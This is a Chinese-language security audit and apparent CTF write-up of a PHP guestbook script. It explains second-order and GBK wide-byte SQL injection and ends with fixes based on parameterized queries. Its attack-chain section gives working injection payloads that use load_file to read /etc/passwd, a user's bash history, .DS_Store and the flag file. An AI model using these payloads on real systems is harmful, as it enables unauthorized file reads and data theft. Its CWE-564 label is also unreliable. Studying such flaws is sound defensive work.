# write_do.php 二次 SQL 注入 + 宽字节注入 — 逐行安全审计

## 审计源码

```php
<?php
include "mysql.php";
session_start();
if($_SESSION['login'] != 'yes'){
    header("Location: ./login.php");
    die();
}

if(isset($_GET['do'])){
    switch ($_GET['do'])
    {
    case 'write':
        $category = addslashes($_POST['category']);
        $title = addslashes($_POST['title']);
        $content = addslashes($_POST['content']);
        $sql = "insert into board
                set category = '$category',
                    title = '$title',
                    content = '$content'";
        $result = mysql_query($sql);
        header("Location: ./index.php");
        break;

    case 'comment':
        $bo_id = addslashes($_POST['bo_id']);
        $sql = "select category from board where id='$bo_id'";
        $result = mysql_query($sql);
        $num = mysql_num_rows($result);
        if($num>0){
            $category = mysql_fetch_array($result)['category'];
            $content = addslashes($_POST['content']);
            $sql = "insert into comment
                    set category = '$category',
                        content = '$content',
                        bo_id = '$bo_id'";
            $result = mysql_query($sql);
        }
        header("Location: ./comment.php?id=$bo_id");
        break;

    default:
        header("Location: ./index.php");
        break;
    }
}
?>
```

> 注：以上源码根据审计报告中的逐行分析重构，行号可能与原始文件略有出入。

---

## 漏洞等级：高危（可读取服务器任意文件、获取 Flag）

---

## 一、漏洞概览

这个文件包含了**两个独立的 SQL 注入漏洞**：

| # | 漏洞 | 位置 | 触发路径 |
|---|------|------|----------|
| 1 | **二次注入** | `comment` 分支第 31-37 行 | write 写入恶意数据 → comment 取出时触发 |
| 2 | **宽字节注入** | `write` 分支第 14-21 行 | GBK 编码 + addslashes → 用 `%df'` 逃逸单引号 |

---

## 二、逐行拆解

### 第 4-9 行：session 登录检查

```php
include "mysql.php";
session_start();
if($_SESSION['login'] != 'yes'){
    header("Location: ./login.php");
    die();
}
```

本身没有问题。但要注意 `session_start()` 必须在输出任何 HTML 之前调用，否则会失败。

---

### 第 10-11 行：路由分发

```php
if(isset($_GET['do'])){
    switch ($_GET['do'])
```

根据 GET 参数 `do` 的值分发到 `write` 或 `comment` 分支。`$_GET['do']` 本身没有过滤，但由于只跟固定字符串做 `switch` 匹配，未匹配时走 `default` 跳回首页，这里没有注入风险。

---

### 第 13-23 行：`case 'write'` — 写留言

```php
case 'write':
    $category = addslashes($_POST['category']);
    $title = addslashes($_POST['title']);
    $content = addslashes($_POST['content']);
    $sql = "insert into board
            set category = '$category',
                title = '$title',
                content = '$content'";
    $result = mysql_query($sql);
    header("Location: ./index.php");
    break;
```

#### addslashes() 的工作原理

`addslashes()` 在四个字符前面加反斜杠：单引号 `'`、双引号 `"`、反斜杠 `\`、NULL 字节。

```
输入:  test'abc
输出:  test\'abc
```

拼入 SQL 后变成：

```sql
INSERT INTO board SET category = 'test\'abc', ...
```

MySQL 解析这段 SQL 时，`\'` 被解释为"字面量单引号"（不是字符串结束符）。所以 `test'abc` 被安全地存入了数据库。

**但关键知识点来了**：反斜杠是给 MySQL 解析器看的，**MySQL 存入数据库的是原始数据 `test'abc`**，不含反斜杠。这就为下面的二次注入埋下了伏笔。

#### 为什么 addslashes 在 GBK 编码下也不安全

如果数据库连接使用 GBK 编码，攻击者可以构造**宽字节注入**：

```
输入:  %df'     (URL 编码后是 0xdf 后面跟单引号)
addslashes 后变成:  %df\'    (0xdf 0x5c 0x27)

GBK 编码规则：
  - GBK 的第一个字节范围: 0x81-0xFE
  - 第二个字节范围: 0x40-0xFE

0xdf (第一个字节) + 0x5c (反斜杠，恰好落在 0x40-0xFE) = GBK 汉字 "運"

MySQL 按 GBK 解析: 運'  ← 反斜杠被"吃掉了"！单引号成功逃逸！
```

字符串闭合了，后面的内容就成了 SQL 代码。

**为什么 GBK 有这个特性而 UTF-8 没有**：UTF-8 的多字节序列中，后续字节不会与 0x5c（反斜杠）产生歧义。GBK 的编码设计允许 0x5c 出现在多字节字符的第二字节位置。

---

### 第 24-39 行：`case 'comment'` — 写评论（真正的漏洞核心）

```php
case 'comment':
    $bo_id = addslashes($_POST['bo_id']);
    $sql = "select category from board where id='$bo_id'";
    $result = mysql_query($sql);                          // [1] 第一次查询
    $num = mysql_num_rows($result);
    if($num>0){
        $category = mysql_fetch_array($result)['category']; // [2] 取出 category
        $content = addslashes($_POST['content']);
        $sql = "insert into comment                         // [3] 第二次查询
                set category = '$category',                 // ← $category 没有任何转义！
                    content = '$content',
                    bo_id = '$bo_id'";
        $result = mysql_query($sql);
    }
    header("Location: ./comment.php?id=$bo_id");
    break;
```

#### 逐行跟踪数据流

**[1] 第 27 行 — 第一次查询**

`$bo_id` 经过了 `addslashes()`，这里基本安全。从 `board` 表中取出 `category` 字段。

**[2] 第 31 行 — 取出未转义的数据**

```php
$category = mysql_fetch_array($result)['category'];
```

**这就是漏洞的根源**。程序员想当然地认为"数据库里的数据是安全的，因为存进去之前已经转义过了"。但实际上：

1. 数据是 write 阶段存入的（经过 `addslashes`）
2. MySQL 存入的是原始值（反斜杠被吃掉了）
3. comment 阶段取出来的是原始值 `test'abc`
4. 这个原始值**又**被拼进了一条新的 INSERT 语句
5. **这次没有经过任何转义**

**[3] 第 33-36 行 — 第二次查询，漏洞触发**

```sql
INSERT INTO comment 
SET category = 'test'abc',    ← 单引号在这里闭合了！abc' 是语法错误
    content = 'xxx',
    bo_id = '2'
```

#### 完整攻击数据流

```
[write 阶段 — 攻击者植入恶意 SQL 片段]
POST category = test',content=database(),/*     ← addslashes 转义: test\',content=database(),/*
     存入数据库的原始值: test',content=database(),/*   ← 反斜杠被 MySQL 吃掉

[comment 阶段 — 恶意 SQL 片段被激活]
SELECT category FROM board WHERE id=2
取出: test',content=database(),/*               ← 无转义！
拼入 INSERT:
  INSERT INTO comment 
  SET category = 'test',content=database(),/*',    ← 闭合！database() 被执行！
      content = '*/#',                              ← 注释掉剩余内容
      bo_id = '2'
```

**解释 `/*` 和 `*/#` 的配合**：

因为 INSERT 是**多行**语句（用 `\n` 分隔），不能用单个 `#` 注释所有行。`#` 只注释到行尾。

```
INSERT INTO comment SET 
    category = 'test',content=database(),/*',   ← /* 把后面的 title 和 content 变成注释
        content = '*/#',                        ← */ 关闭注释，# 注释掉 bo_id 行
        bo_id = '2'
```

结果等价于：

```sql
INSERT INTO comment SET category = 'test',content=database()
```

`database()` 被执行，返回了数据库名 `ctf`。

---

## 三、完整攻击链复现（已在实际测试中验证）

### 攻击步骤

**Step 1 — write 阶段：在 category 中植入恶意 SQL 片段**

```
POST /write_do.php?do=write
title=test&category=test',content=database(),/*&content=test
```

存入 board 表的 category 值为 `test',content=database(),/*`

**Step 2 — comment 阶段：触发二次注入**

```
POST /write_do.php?do=comment
content=*/#&bo_id=<刚才那条留言的ID>
```

执行 `database()` → 返回 `ctf`

**Step 3 — 扩展到文件读取**

把 `database()` 替换为 `(select(load_file("/etc/passwd")))`：

```
category=test',content=(select(load_file("/etc/passwd"))),/*
```

成功读取 `/etc/passwd`，发现 `www` 用户有家目录 `/home/www` 且可以执行 `/bin/bash`。

**Step 4 — 读取 bash 历史**

```
category=test',content=(select(load_file("/home/www/.bash_history"))),/*
```

返回：`cd /tmp/ && unzip html.zip && rm -f html.zip && cp -r html /var/www/`

发现文件来自 `/tmp/html/`。

**Step 5 — 通过 .DS_Store 枚举文件**

```
category=test',content=(select(hex(load_file("/tmp/html/.DS_Store")))),/*
```

解码 hex 后得到目录结构，发现 `flag_8946e1ff1ee3e40f.php`。

**Step 6 — 读取 Flag**

```
category=test',content=(select(hex(load_file("/var/www/html/flag_8946e1ff1ee3e40f.php")))),/*
```

解码 hex 后获取 flag。

---

## 四、漏洞对比：为什么二次注入比普通注入更难被发现

| | 普通 SQL 注入 | 二次注入 |
|---|---|---|
| 恶意输入从哪里进入 | 直接从 HTTP 请求进入 SQL | 先存入数据库，再取出来进入 SQL |
| addslashes 防护 | 在第一次拼接时转义，可能挡住 | 数据从数据库取出时没有转义，**100% 绕过** |
| 自动化扫描器检测 | 通常能检测到 | **极难检测**，需要理解业务逻辑 |
| 代码审计发现 | grep 危险函数 + 检查参数来源 | **需要跟踪完整数据流**：来源 → 存储 → 取出 → 使用 |

**本质**：程序员信任了数据库中的数据。这是最常见也是最危险的假设——"存进去之前已经处理过了，取出来就是安全的"。但实际上，安全措施必须施加在**使用数据的时刻**，而不是**写入数据的时刻**。

---

## 五、修复方案

### 5.1 根本修复：全部使用参数化查询

```php
// write 分支
$stmt = mysqli_prepare($con, 
    "INSERT INTO board SET category=?, title=?, content=?");
mysqli_stmt_bind_param($stmt, "sss", 
    $_POST['category'], $_POST['title'], $_POST['content']);
mysqli_stmt_execute($stmt);

// comment 分支
$stmt = mysqli_prepare($con, 
    "SELECT category FROM board WHERE id=?");
mysqli_stmt_bind_param($stmt, "i", $_POST['bo_id']);
mysqli_stmt_execute($stmt);
$result = mysqli_stmt_get_result($stmt);

if(mysqli_num_rows($result) > 0) {
    $row = mysqli_fetch_array($result);
    $category = $row['category'];
    $content = $_POST['content'];
    
    // $category 来自数据库，但用参数化查询所以即使含单引号也安全
    $stmt2 = mysqli_prepare($con,
        "INSERT INTO comment SET category=?, content=?, bo_id=?");
    mysqli_stmt_bind_param($stmt2, "ssi", 
        $category, $content, $_POST['bo_id']);
    mysqli_stmt_execute($stmt2);
}
```

**关键点**：`$category` 从数据库取出来可能含有单引号，但因为用了 `?` 占位符，它永远被当作字符串数据，不会破坏 SQL 结构。

### 5.2 治标方案：统一编码

```php
// 数据库连接后
mysqli_set_charset($con, "utf8mb4");
```

用 UTF-8 替代 GBK，彻底消除宽字节注入的可能性。但**不能替代参数化查询**——这只是堵了一个绕过路径，二次注入的根本原因（数据取出后未转义）依然存在。

### 5.3 治标方案：输出时也转义

```php
$category = mysql_fetch_array($result)['category'];
$category = addslashes($category);  // 取出来后再转义一次
```

能防住当前场景，但属于**"打补丁"思维**：这次记着转了，下次呢？换个程序员呢？参数化查询才是一劳永逸的解法。

---

## 六、关联知识

- **CWE-89**: SQL Injection（一阶）
- **CWE-564**: Second-Order SQL Injection
- **CWE-90**: LDAP Injection（类似的"存入→取出→执行"模式）
- **GBK 宽字节注入原理**: 参考 `addslashes()` PHP 文档中的警告——文档明确说 GBK 等宽字符集下不安全
- **mysql_set_charset() vs SET NAMES**: 前者会通知 MySQL 客户端库当前的字符集，后者只改变了服务端变量但客户端库不知道，导致转义仍然按 latin1 执行
